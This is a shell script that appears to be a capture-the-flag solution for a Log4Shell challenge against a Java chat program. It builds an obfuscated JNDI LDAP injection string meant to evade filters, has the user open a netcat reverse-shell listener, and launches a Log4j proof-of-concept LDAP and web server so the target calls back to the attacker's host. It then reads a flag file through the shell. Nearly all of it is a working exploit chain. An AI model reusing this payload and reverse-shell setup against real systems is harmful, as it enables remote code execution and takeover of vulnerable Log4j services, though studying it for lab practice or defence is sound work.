if [ -z "$1" ]; then
    echo "Usage: solution.sh <shellbox_ip_address>"
    exit
fi

send="\${j\${upper:n}di:l\${lo\${upper:w}er:d}ap://"
ip=${1//./\$\{upper:.\}}
send="$send$ip:1389/a}"

echo "In a new terminal, run: nc -lnvp 9001"
echo
echo "Press Enter to continue."
read

echo "In a new terminal, run: log4j-shell-poc/jdk1.8.0_20/bin/java -jar Client.jar <target_ip> 8001"
echo
echo "Press Enter to continue."
read

echo "Ensure the chat program has had a minute to initialise after connecting."
echo
echo "Press Enter to continue."
read

echo "Press enter to continue, then paste $send in the java chat program and send it as a message."
echo "Send the message 20 seconds after pressing enter to continue."
echo
echo "Press Enter to continue."
read

echo "Starting LDAP and web server."
python3 log4j-shell-poc/poc.py --userip $1 --webport 65000

echo "Use the netcat shell to cat /flag.txt"

